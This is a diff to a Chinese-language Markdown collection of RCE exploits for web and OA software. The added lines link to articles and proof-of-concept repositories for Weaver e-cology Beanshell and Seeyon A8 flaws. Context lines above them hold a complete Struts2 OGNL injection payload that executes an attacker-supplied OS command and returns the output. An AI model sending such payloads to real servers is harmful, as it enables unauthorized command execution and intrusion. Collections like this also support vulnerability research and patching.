@@ -84,8 +84,18 @@
     message=(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#w=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]).getInputStream()))).(#w.close())&cmd=whoami
     ```
 
+**e-cology OA Beanshell 组件远程代码执行**
+- 文章
+    - [[漏洞预警]泛微e-cology OA Beanshell组件远程代码执行分析](https://mp.weixin.qq.com/s/Hr6fSOaPcTp2YaD-fPMxyg)
+
+- POC | Payload | exp
+    - [jas502n/e-cology](https://github.com/jas502n/e-cology)
+
 ## 致远 OA
 **A8-OA-seeyon-RCE**
+- 文章
+    - [致远A8协同办公系统poc/seeyon 0day](https://www.jianshu.com/p/562f45edde2d)
+
 - POC | Payload | exp
     - [RayScri/A8-OA-seeyon-RCE](https://github.com/RayScri/A8-OA-seeyon-RCE)
 
